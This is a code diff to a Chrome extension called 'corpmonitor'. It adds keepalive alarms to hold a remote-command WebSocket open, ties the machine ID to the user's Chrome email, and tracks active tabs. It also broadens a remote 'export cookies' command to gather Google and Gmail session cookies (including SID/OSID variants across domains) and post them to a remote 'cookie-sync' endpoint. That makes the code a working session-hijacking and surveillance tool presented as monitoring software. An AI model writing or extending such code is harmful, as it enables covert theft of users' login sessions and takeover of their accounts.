@@ -53,6 +53,10 @@ chrome.runtime.onInstalled.addListener(async () => {
     // Set up periodic cleanup and maintenance
     setInterval(performMaintenance, 60000); // Every minute
     
+    // Set up keepalive alarm to prevent service worker suspension
+    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
+    log('debug', '⏰ Keepalive alarm configured (every 1 minute)');
+    
     log('debug', 'Initializing remote control connection...');
     // Initialize remote control connection
     initializeRemoteControl();
@@ -68,10 +72,41 @@ chrome.runtime.onStartup.addListener(async () => {
   try {
     log('info', '🔄 Browser started, initializing extension...');
     await initializeExtension();
+    
+    // Set up keepalive alarm
+    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
+    log('debug', '⏰ Keepalive alarm configured');
+    
     initializeRemoteControl();
     log('info', '✅ Startup initialization complete');
   } catch (error) {
     log('error', '❌ Failed startup initialization', error);
+  }
+});
+
+// Handle alarms for keepalive and maintenance
+chrome.alarms.onAlarm.addListener(async (alarm) => {
+  if (alarm.name === 'corpmonitor-keepalive') {
+    // Keepalive to prevent service worker suspension
+    log('debug', '💓 Keepalive ping - ensuring WebSocket connection');
+    
+    // Reinitialize remote control if disconnected
+    if (!commandSocket || commandSocket.readyState !== WebSocket.OPEN) {
+      log('warn', '🔌 WebSocket disconnected during keepalive - reconnecting...');
+      initializeRemoteControl();
+    }
+    
+    // Send heartbeat for all active tabs to maintain presence
+    try {
+      const tabs = await chrome.tabs.query({ active: true });
+      for (const tab of tabs) {
+        if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+          await trackSession(tab);
+        }
+      }
+    } catch (error) {
+      log('error', '❌ Keepalive heartbeat failed', error);
+    }
   }
 });
 
@@ -80,14 +115,22 @@ async function initializeExtension() {
   log('debug', '📋 Loading stored configuration...');
   const result = await chrome.storage.local.get(['machineId', 'monitoringEnabled']);
   
-  if (!result.machineId) {
-    machineId = await generateMachineId();
-    log('info', `🆔 Generated new machine ID: ${machineId}`);
-    await chrome.storage.local.set({ machineId });
-  } else {
-    machineId = result.machineId;
-    log('debug', `🆔 Loaded existing machine ID: ${machineId}`);
+  // Generate fresh machine ID (email only, no timestamp)
+  const freshMachineId = await generateMachineId();
+  
+  // Check if migration is needed (old format with timestamp/random)
+  const oldMachineId = result.machineId;
+  let needsMigration = false;
+  
+  if (oldMachineId && oldMachineId !== freshMachineId) {
+    log('warn', `🔄 Migrating machine_id from "${oldMachineId}" to "${freshMachineId}"`);
+    needsMigration = true;
   }
+  
+  // Set machine ID (either migrated or fresh)
+  machineId = freshMachineId;
+  await chrome.storage.local.set({ machineId });
+  log('info', `🆔 Machine ID set to: ${machineId}`);
   
   // Auto-enable monitoring on installation
   monitoringEnabled = result.monitoringEnabled !== undefined ? result.monitoringEnabled : true;
@@ -97,6 +140,17 @@ async function initializeExtension() {
   });
   
   log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
+  
+  // If migrated, reconnect WebSocket with new machine_id
+  if (needsMigration) {
+    log('info', '🔌 Machine ID migrated - reconnecting WebSocket...');
+    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
+      commandSocket.close();
+    }
+    setTimeout(() => {
+      initializeRemoteControl();
+    }, 1000);
+  }
 }
 
 // Generate unique machine ID with Chrome user email
@@ -754,7 +808,7 @@ async function handleExportCookiesCommand(data) {
     const url = new URL(tab.url);
     const host = url.hostname;
     
-    log('info', `Export cookies command for tab ${tabId}, host: ${host}`);
+    log('info', `🍪 Export cookies command for tab ${tabId}, host: ${host}`);
     
     // Collect cookies from this host and related domains
     const domains = [host];
@@ -764,10 +818,10 @@ async function handleExportCookiesCommand(data) {
       domains.push('www.' + host);
     }
     
-    // For common auth domains
+    // For common auth domains (especialmente Google)
     const baseDomain = host.split('.').slice(-2).join('.');
     if (host.includes('google.com')) {
-      domains.push('accounts.google.com', '.google.com');
+      domains.push('mail.google.com', 'accounts.google.com', '.google.com', 'google.com');
     }
     
     const allCookies = [];
@@ -780,10 +834,12 @@ async function handleExportCookiesCommand(data) {
       }
     }
     
-    // Deduplicate by name
+    // Deduplicate by name::domain::path to preserve cookie variations
+    // This is important for sites like Gmail where OSID/SID cookies exist for different domains
     const cookieMap = new Map();
     for (const cookie of allCookies) {
-      cookieMap.set(cookie.name, {
+      const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
+      cookieMap.set(key, {
         name: cookie.name,
         value: cookie.value,
         domain: cookie.domain,
@@ -796,7 +852,8 @@ async function handleExportCookiesCommand(data) {
     }
     
     const cookies = Array.from(cookieMap.values());
-    log('info', `Collected ${cookies.length} unique cookies for export`);
+    log('info', `🍪 Collected ${cookies.length} unique cookies from ${domains.length} domains`);
+    log('info', `📋 Cookie names: ${cookies.slice(0, 10).map(c => c.name).join(', ')}${cookies.length > 10 ? '...' : ''}`);
     
     // Send to cookie-sync edge function
     const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
